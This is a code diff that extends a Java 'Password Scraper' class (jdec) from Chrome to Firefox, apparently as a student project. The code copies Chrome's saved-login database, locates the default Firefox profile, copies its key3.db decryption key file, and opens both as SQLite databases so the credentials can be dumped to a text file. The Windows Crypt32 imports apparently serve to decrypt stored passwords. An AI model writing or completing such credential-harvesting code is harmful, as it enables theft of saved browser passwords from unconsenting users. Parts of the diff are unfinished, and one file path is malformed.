@@ -7,8 +7,14 @@ import com.sun.jna.*;
 import com.sun.jna.platform.win32.*;
 import com.sun.jna.platform.win32.WinCrypt.DATA_BLOB;
 
+import java.nio.file.*;
+import java.nio.file.attribute.*;
+import static java.nio.file.FileVisitResult.*;
+import static java.nio.file.FileVisitOption.*;
+
 import java.io.File;
 import java.io.FileNotFoundException;
+import java.io.IOException;
 import java.io.FileOutputStream;
 import java.io.InputStream;
 import java.io.PrintStream;
@@ -20,7 +26,8 @@ import java.sql.ResultSetMetaData;
 import java.sql.SQLException;
 import java.sql.Statement;
 
-// Password Scraper for Chrome on Windows
+// Password Scraper for Chrome/Firefox/IE for Windows/Linux/Mac
+// 4th Year Project?
 
 public class jdec extends Crypt32Util {
 	
@@ -36,15 +43,38 @@ public class jdec extends Crypt32Util {
 		File chromedest = FileUtils.getFile("logindata.db");
 		FileUtils.copyFile(chrome, chromedest);
 		
+		// Firefox -- Uses a decryption key in the Mozilla folder which we need to use, password file is in JSON format
+		File firefoxloc = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles");
+		String[] fuckfirefox = firefoxloc.list();
+		String userloc = new String();
+		
+		// Search for profile default login, potentially other usernames but most people will use default Firefox profile
+		for(String directory : fuckfirefox){
+			if(directory.contains(".default")){
+				userloc = directory;
+			}
+		}
+		
+		// WIP -- Get JSON file, put data into array
+		
+		// Get Key File
+		File firefox = FileUtils.getFile("C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/" + userloc + "key3.db");
+		File firefoxdest = FileUtils.getFile("logindata2.db");
+		FileUtils.copyFile(firefox, firefoxdest);
+		
+		
 		// Redirect output to text file
 		PrintStream out = new PrintStream(new FileOutputStream("output.txt"));
 		System.setOut(out);
 		
 		Connection conn = null;
+		Connection conn2 = null;
 
 		// Use arguments string for db url
 		String url = "jdbc:sqlite:logindata.db";
+		String url2 = "jdbc:sqlite:logindata2.db";
 		conn = DriverManager.getConnection(url);
+		conn2 = DriverManager.getConnection(url2);
 		
 		// SQL Queries
 		Statement stmt1 = conn.createStatement();
